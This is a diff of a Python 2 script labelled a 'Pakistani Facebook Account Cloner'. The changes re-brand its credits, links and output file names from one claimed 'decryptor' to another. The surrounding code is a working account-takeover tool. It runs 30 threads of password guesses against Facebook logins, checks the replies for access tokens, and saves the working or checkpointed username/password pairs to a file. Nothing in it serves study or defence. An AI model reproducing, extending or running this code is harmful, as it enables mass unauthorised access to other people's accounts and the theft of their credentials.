@@ -198,7 +198,7 @@ def login_pilih():
         
 def More():
 	os.system("clear")
-	os.system('xdg-open https://github.com/Alicybery420')
+	os.system('xdg-open https://github.com/Aadilafg001')
 	os.system('login')
 	
 	
@@ -208,9 +208,9 @@ def More():
 def Find():
     os.system("clear")
     os.system('toilet -f future Find Me --filter border')
-    jalan('\x1b[1;93m decrypted by\x1b[1;96m     :\x1b[1;93m   Ali | Cybery') 
-    jalan('\x1b[1;92m Github\x1b[1;96m     :\x1b[1;92m   Alicybery420')
-    jalan('\x1b[1;96m Telegram\x1b[1;96m   :\x1b[1;96m   t.me/Cyberyking')
+    jalan('\x1b[1;93m decrypted by\x1b[1;96m     :\x1b[1;93m   Emran | Aadil') 
+    jalan('\x1b[1;92m Github\x1b[1;96m     :\x1b[1;92m   Aadilafg001')
+    jalan('\x1b[1;96m Facebook\x1b[1;96m   :\x1b[1;96m   https://www.facebook.com/hamza.aadil.391')
     os.system('xdg-open https://t.me/Cyberyking') 
     os.system("login")
        
@@ -234,9 +234,9 @@ def Zeek():
     print '\x1b[1;96m    Pakistani Facebook Account Cloner'
     print '\x1b[1;97m ╔═══════════════════════════════════════════╗'
 
-    print'\x1b[1;97m ║\x1b[1;92m decrypted by  \x1b[1;96m    : \x1b[1;93m  Ali | Cybery         \x1b[1;97m║'
-    print'\x1b[1;97m ║\x1b[1;92m Github  \x1b[1;96m    : \x1b[1;93m  github.com/Alicybery420  \x1b[1;97m║'
-    print'\x1b[1;97m ║\x1b[1;92m Telegram  \x1b[1;96m  : \x1b[1;93m  T.me/Cyberyking \x1b[1;97m║'
+    print'\x1b[1;97m ║\x1b[1;92m decrypted by  \x1b[1;96m    : \x1b[1;93m  Emran | Aadil         \x1b[1;97m║'
+    print'\x1b[1;97m ║\x1b[1;92m Github  \x1b[1;96m    : \x1b[1;93m  github.com/Aadilafg001  \x1b[1;97m║'
+    print'\x1b[1;97m ║\x1b[1;92m Facebook  \x1b[1;96m  : \x1b[1;93m  https://www.facebook.com/hamza.aadil.391 \x1b[1;97m║'
     time.sleep(0.05)    
     print '\x1b[1;97m ╚═══════════════════════════════════════════╝'
     print '                                        '
@@ -272,9 +272,9 @@ def action():
         print '\x1b[1;96m    Pakistani Facebook Account Cloner'
         print '\x1b[1;97m ╔═══════════════════════════════════════════╗'
 
-        print'\x1b[1;97m ║\x1b[1;92m decrypted by  \x1b[1;96m    : \x1b[1;93m  Ali | Cybery         \x1b[1;97m║'
-        print'\x1b[1;97m ║\x1b[1;92m Github  \x1b[1;96m    : \x1b[1;93m  github.com/Alicybery420  \x1b[1;97m║'
-        print'\x1b[1;97m ║\x1b[1;92m Telegram  \x1b[1;96m  : \x1b[1;93m  T.me/Cyberyking \x1b[1;97m║'
+        print'\x1b[1;97m ║\x1b[1;92m decrypted by  \x1b[1;96m    : \x1b[1;93m  Emran | Aadil         \x1b[1;97m║'
+        print'\x1b[1;97m ║\x1b[1;92m Github  \x1b[1;96m    : \x1b[1;93m  github.com/Aadilafg001  \x1b[1;97m║'
+        print'\x1b[1;97m ║\x1b[1;92m Facebook  \x1b[1;96m  : \x1b[1;93m  https://www.facebook.com/hamza.aadil.391 \x1b[1;97m║'
         time.sleep(0.05)    
         print '\x1b[1;97m ╚═══════════════════════════════════════════╝'
         print '                                        ' 
@@ -304,9 +304,9 @@ def action():
         print '\x1b[1;96m    Pakistani Facebook Account Cloner'
         print '\x1b[1;97m ╔═══════════════════════════════════════════╗'
 
-        print'\x1b[1;97m ║\x1b[1;92m decrypted by  \x1b[1;96m    : \x1b[1;93m  Ali | Cybery         \x1b[1;97m║'
-        print'\x1b[1;97m ║\x1b[1;92m Github  \x1b[1;96m    : \x1b[1;93m   github.com/Alicybery420 \x1b[1;97m║'
-        print'\x1b[1;97m ║\x1b[1;92m Telegram  \x1b[1;96m  : \x1b[1;93m  T.me/Cyberyking \x1b[1;97m║'
+        print'\x1b[1;97m ║\x1b[1;92m decrypted by  \x1b[1;96m    : \x1b[1;93m  Emran | Aadil         \x1b[1;97m║'
+        print'\x1b[1;97m ║\x1b[1;92m Github  \x1b[1;96m    : \x1b[1;93m   github.com/Aadilafg001 \x1b[1;97m║'
+        print'\x1b[1;97m ║\x1b[1;92m Facebook  \x1b[1;96m  : \x1b[1;93m  https://www.facebook.com/hamza.aadil.391 \x1b[1;97m║'
         time.sleep(0.05)    
         print '\x1b[1;97m ╚═══════════════════════════════════════════╝'
         print '                                        ' 
@@ -334,9 +334,9 @@ def action():
         print '\x1b[1;96m    Pakistani Facebook Account Cloner'
         print '\x1b[1;97m ╔═══════════════════════════════════════════╗'
 
-        print'\x1b[1;97m ║\x1b[1;92m decrypted by  \x1b[1;96m    : \x1b[1;93m  Ali | Cybery         \x1b[1;97m║'
-        print'\x1b[1;97m ║\x1b[1;92m Github  \x1b[1;96m    : \x1b[1;93m  github.com/Alicybery420  \x1b[1;97m║'
-        print'\x1b[1;97m ║\x1b[1;92m Telegram  \x1b[1;96m  : \x1b[1;93m  T.me/Cyberyking \x1b[1;97m║'
+        print'\x1b[1;97m ║\x1b[1;92m decrypted by  \x1b[1;96m    : \x1b[1;93m  Emran | Aadil         \x1b[1;97m║'
+        print'\x1b[1;97m ║\x1b[1;92m Github  \x1b[1;96m    : \x1b[1;93m  github.com/Aadilafg001 \x1b[1;97m║'
+        print'\x1b[1;97m ║\x1b[1;92m Facebook  \x1b[1;96m  : \x1b[1;93m  https://www.facebook.com/hamza.aadil.391 \x1b[1;97m║'
         time.sleep(0.05)    
         print '\x1b[1;97m ╚═══════════════════════════════════════════╝'
         print '                                        ' 
@@ -365,9 +365,9 @@ def action():
         print '\x1b[1;96m    Pakistani Facebook Account Cloner'
         print '\x1b[1;97m ╔═══════════════════════════════════════════╗'
 
-        print'\x1b[1;97m ║\x1b[1;92m decrypted by  \x1b[1;96m    : \x1b[1;93m  Ali | Cybery         \x1b[1;97m║'
-        print'\x1b[1;97m ║\x1b[1;92m Github  \x1b[1;96m    : \x1b[1;93m  github.com/Alicybery420  \x1b[1;97m║'
-        print'\x1b[1;97m ║\x1b[1;92m Telegram  \x1b[1;96m  : \x1b[1;93m  T.me/Cyberyking \x1b[1;97m║'
+        print'\x1b[1;97m ║\x1b[1;92m decrypted by  \x1b[1;96m    : \x1b[1;93m  Emran | Aadil         \x1b[1;97m║'
+        print'\x1b[1;97m ║\x1b[1;92m Github  \x1b[1;96m    : \x1b[1;93m  github.com/Aadilafg001  \x1b[1;97m║'
+        print'\x1b[1;97m ║\x1b[1;92m Facebook  \x1b[1;96m  : \x1b[1;93m  https://www.facebook.com/hamza.aadil.391 \x1b[1;97m║'
         time.sleep(0.05)    
         print '\x1b[1;97m ╚═══════════════════════════════════════════╝'
         print '                                        ' 
@@ -395,9 +395,9 @@ def action():
         print '\x1b[1;96m    Pakistani Facebook Account Cloner'
         print '\x1b[1;97m ╔═══════════════════════════════════════════╗'
 
-        print'\x1b[1;97m ║\x1b[1;92m decrypted by  \x1b[1;96m    : \x1b[1;93m  Ali | Cybery         \x1b[1;97m║'
-        print'\x1b[1;97m ║\x1b[1;92m Github  \x1b[1;96m    : \x1b[1;93m  github.com/Alicybery420  \x1b[1;97m║'
-        print'\x1b[1;97m ║\x1b[1;92m Telegram  \x1b[1;96m  : \x1b[1;93m  T.me/Cyberyking \x1b[1;97m║'
+        print'\x1b[1;97m ║\x1b[1;92m decrypted by  \x1b[1;96m    : \x1b[1;93m  Emran | Aadil         \x1b[1;97m║'
+        print'\x1b[1;97m ║\x1b[1;92m Github  \x1b[1;96m    : \x1b[1;93m  github.com/Aadilafg001  \x1b[1;97m║'
+        print'\x1b[1;97m ║\x1b[1;92m Facebook  \x1b[1;96m  : \x1b[1;93m  https://www.facebook.com/hamza.aadil.391 \x1b[1;97m║'
         time.sleep(0.05)    
         print '\x1b[1;97m ╚═══════════════════════════════════════════╝'
         print '                                        ' 
@@ -439,9 +439,9 @@ def action():
     print '\x1b[1;96m    Pakistani Facebook Account Cloner'
     print '\x1b[1;97m ╔═══════════════════════════════════════════╗'
 
-    print'\x1b[1;97m ║\x1b[1;92m decrypted by  \x1b[1;96m    : \x1b[1;93m  Ali | Cybery         \x1b[1;97m║'
-    print'\x1b[1;97m ║\x1b[1;92m Github  \x1b[1;96m    : \x1b[1;93m  github.com/Alicybery420  \x1b[1;97m║'
-    print'\x1b[1;97m ║\x1b[1;92m Telegram  \x1b[1;96m  : \x1b[1;93m  T.me/Cyberyking \x1b[1;97m║'
+    print'\x1b[1;97m ║\x1b[1;92m decrypted by  \x1b[1;96m    : \x1b[1;93m  Emran | Aadil         \x1b[1;97m║'
+    print'\x1b[1;97m ║\x1b[1;92m Github  \x1b[1;96m    : \x1b[1;93m  github.com/Aadilafg001 \x1b[1;97m║'
+    print'\x1b[1;97m ║\x1b[1;92m Facebook  \x1b[1;96m  : \x1b[1;93m  https://www.facebook.com/hamza.aadil.391 \x1b[1;97m║'
     time.sleep(0.05)    
     print '\x1b[1;97m ╚═══════════════════════════════════════════╝'
     print'                       '
@@ -455,7 +455,7 @@ def action():
         global cpb,oks
         user = arg
         try:
-            os.mkdir('Ali')
+            os.mkdir('Emran')
         except OSError:
             pass
         try:        	
@@ -464,14 +464,14 @@ def action():
             q = json.load(data)
             if 'access_token' in q:
                 print '\x1b[1;91m[\x1b[1;92mAC-OK\x1b[1;91m]  ' + k + c + user + '  |  ' + pass1                                       
-                okb = open('Ali/AC-CP-OK.txt', 'a')
+                okb = open('Emran/EA-CP-OK.txt', 'a')
                 okb.write(k+c+user+pass1+'\n')
                 okb.close()
                 oks.append(c+user+pass1)
             else:
                 if 'www.facebook.com' in q['error_msg']:
                     print '\033[1;91m[\x1b[1;96mAC-CP\x1b[1;91m]\x1b[1;97m ' + k + c + user + '  |  ' + pass1
-                    cps = open('Ali/AC-CP-OK.txt', 'a')
+                    cps = open('Emran/EA-CP-OK.txt', 'a')
                     cps.write(k+c+user+pass1+'\n')
                     cps.close()
                     cpb.append(c+user+pass1)
@@ -481,14 +481,14 @@ def action():
                     q = json.load(data)
                     if 'access_token' in q:
                         print '\x1b[1;91m[\x1b[1;92mAC-OK\x1b[1;91m]  ' + k + c + user +  '  |  ' + pass2
-                        okb = open('Ali/AC-CP-OK.txt', 'a')
+                        okb = open('Emran/EA-CP-OK.txt', 'a')
                         okb.write(k+c+user+pass2+'\n')
                         okb.close()
                         oks.append(c+user+pass2)
                     else:
                         if 'www.facebook.com' in q['error_msg']:
                             print '\033[1;91m[\x1b[1;96mAC-CP\x1b[1;91m]\x1b[1;97m ' + k + c + user + '  |  ' + pass2
-                            cps = open('Ali/AC-CP-OK.txt', 'a')
+                            cps = open('Emran/EA-CP-OK.txt', 'a')
                             cps.write(k+c+user+pass2+'\n')
                             cps.close()
                             cpb.append(c+user+pass2)
@@ -498,14 +498,14 @@ def action():
                     q = json.load(data)
                     if 'access_token' in q:
                         print '\x1b[1;91m[\x1b[1;92mAC-OK\x1b[1;91m]  ' + k + c + user +  '  |  ' + pass3
-                        okb = open('Ali/AC-CP-OK.txt', 'a')
+                        okb = open('Emran/EA-CP-OK.txt', 'a')
                         okb.write(k+c+user+pass3+'\n')
                         okb.close()
                         oks.append(c+user+pass3)
                     else:
                         if 'www.facebook.com' in q['error_msg']:
                             print '\033[1;91m[\x1b[1;96mAC-CP\x1b[1;91m]\x1b[1;97m ' + k + c + user + '  |  ' + pass3
-                            cps = open('Ali/AC-CP-OK.txt', 'a')
+                            cps = open('Emran/EA-CP-OK.txt', 'a')
                             cps.write(k+c+user+pass3+'\n')
                             cps.close()
                             cpb.append(c+user+pass3)
@@ -524,9 +524,9 @@ def action():
     p = ThreadPool(30)
     p.map(main, id)
     print 50* '\033[1;91m-'
-    print 'Ali~CyberyProcess Has Been Completed██████▒▒▒▒...100%'
+    print 'Emran~AadilProcess Has Been Completed██████▒▒▒▒...100%'
     print 'Total OK/CP : '+str(len(oks))+'/'+str(len(cpb))
-    print('AC.TM Cloned Accounts Has Been Saved : Ali/AC-CP-OK.txt')
+    print('EA.TM Cloned Accounts Has Been Saved : Emran/EA-CP-OK.txt')
 
     print ''
     print """
